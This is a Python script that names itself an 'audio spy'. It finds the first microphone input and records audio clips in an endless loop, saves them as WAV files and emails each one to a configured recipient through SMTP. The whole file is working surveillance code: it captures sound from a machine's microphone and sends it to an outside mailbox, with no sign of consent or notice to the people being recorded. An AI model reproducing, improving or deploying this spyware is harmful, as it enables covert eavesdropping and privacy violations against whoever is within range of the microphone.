import smtplib
from email.mime.base import MIMEBase
from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import pyaudio
from os.path import join, dirname, exists
from configparser import ConfigParser
from os import makedirs, environ
from sys import argv, exit
from typing import List
from time import sleep
from glob import glob
import wave
import logging

# Initialize logging
logging.basicConfig(level=logging.INFO)

# Function to get the valid device (with input channels)
def get_valid_device():
    pyaudio_instance = pyaudio.PyAudio()

    for i in range(pyaudio_instance.get_device_count()):
        device_info = pyaudio_instance.get_device_info_by_index(i)
        if device_info['maxInputChannels'] > 0:  # Only consider input devices
            logging.info(f"Device {i}: {device_info['name']} supports {device_info['maxInputChannels']} channels.")
            return i, device_info['maxInputChannels']  # Return the index and number of channels
    
    return None, None  # No valid device found

# Get the valid device index and channels
device_index, channels = get_valid_device()

if device_index is not None:
    logging.info(f"Using device {device_index} with {channels} channels")
else:
    logging.error("No valid device found.")
    channels = 1  # Fallback to mono if no device is found

# Configuration load function
def config_load(filename: str = None, argv: List[str] = argv) -> dict:
    CONFIG = ConfigParser()
    default_file_name = "audioSpy.conf"
    default_file_path = join(dirname(__file__), default_file_name)
    env_config_file = environ.get(default_file_name)
    arg_config_file = argv[1] if len(argv) == 2 else None

    if filename and exists(filename):
        CONFIG.read(filename)
    elif arg_config_file and exists(arg_config_file):
        CONFIG.read(arg_config_file)
    elif env_config_file and exists(env_config_file):
        CONFIG.read(env_config_file)
    elif exists(default_file_path):
        CONFIG.read(default_file_path)
    else:
        logging.error("Configuration file is missing or invalid.")
        return {}

    CONFIG = CONFIG.__dict__["_sections"]

    return {
        "save_filename": CONFIG["SAVE"]["filename"],
        "save_dirname": CONFIG["SAVE"]["dirname"],
        "record_time": float(CONFIG["TIME"]["record_time"]),
        "interval": float(CONFIG["TIME"]["interval"]),
        "email_sender": CONFIG["EMAIL"]["sender_email"],
        "email_password": CONFIG["EMAIL"]["sender_password"],
        "email_receiver": CONFIG["EMAIL"]["recipient_email"],
        "smtp_server": CONFIG["EMAIL"]["smtp_server"],
        "smtp_port": int(CONFIG["EMAIL"]["smtp_port"]),
    }

# Send email function
def send_email(filename: str, config: dict) -> None:
    msg = MIMEMultipart()
    msg['From'] = config['email_sender']
    msg['To'] = config['email_receiver']
    msg['Subject'] = 'New Audio Recording'

    body = MIMEText('Here is a new audio recording.')
    msg.attach(body)

    try:
        with open(filename, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={filename}')
            msg.attach(part)

        server = smtplib.SMTP(config['smtp_server'], config['smtp_port'])
        server.starttls()
        server.login(config['email_sender'], config['email_password'])
        server.sendmail(config['email_sender'], config['email_receiver'], msg.as_string())
        server.quit()
        logging.info(f"Audio sent: {filename}")
    except smtplib.SMTPAuthenticationError as e:
        logging.error(f"SMTP Authentication Error: {e}")
        logging.error("Check if the app password is correct and 2FA is enabled.")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")

# Save audio record function
def save_record(filename: str, record_time: float, channels: int = 1) -> None:
    pyaudio_instance = pyaudio.PyAudio()

    try:
        stream = pyaudio_instance.open(
            format=pyaudio.paInt16,
            channels=channels,
            rate=44100,
            input=True,
            frames_per_buffer=1024
        )
    except OSError as e:
        logging.error(f"Error opening audio stream: {e}")
        return

    frames = b"".join([stream.read(1024) for _ in range(0, int(44100 / 1024 * record_time))])

    with wave.open(filename, 'wb') as wf:
        wf.setnchannels(channels)
        wf.setsampwidth(pyaudio_instance.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        wf.writeframes(frames)

    stream.stop_stream()
    stream.close()
    pyaudio_instance.terminate()
    logging.info(f"Audio saved: {filename}")

# Record and send audio function
def record_and_send(config: dict) -> None:
    save_filename = config['save_filename']
    save_dirname = config['save_dirname']
    record_time = config['record_time']
    interval = config['interval']

    makedirs(save_dirname, exist_ok=True)

    increment = len(glob(join(save_dirname, save_filename)))

    while True:
        filename = join(save_dirname, save_filename.replace("*", str(increment)))
        save_record(filename, record_time, channels)  # Use the dynamically detected channel count
        send_email(filename, config)
        increment += 1
        sleep(interval)

# Main function
def main(config_filename: str = None, argv: List[str] = argv) -> int:
    config = config_load(filename=config_filename, argv=argv)

    if not config:
        logging.error("Configuration file is missing or invalid.")
        return 1

    try:
        record_and_send(config)
    except KeyboardInterrupt:
        logging.info("Recording stopped by user.")
        return 0

if __name__ == "__main__":
    logging.info("Starting the audio spy...")
    exit(main())
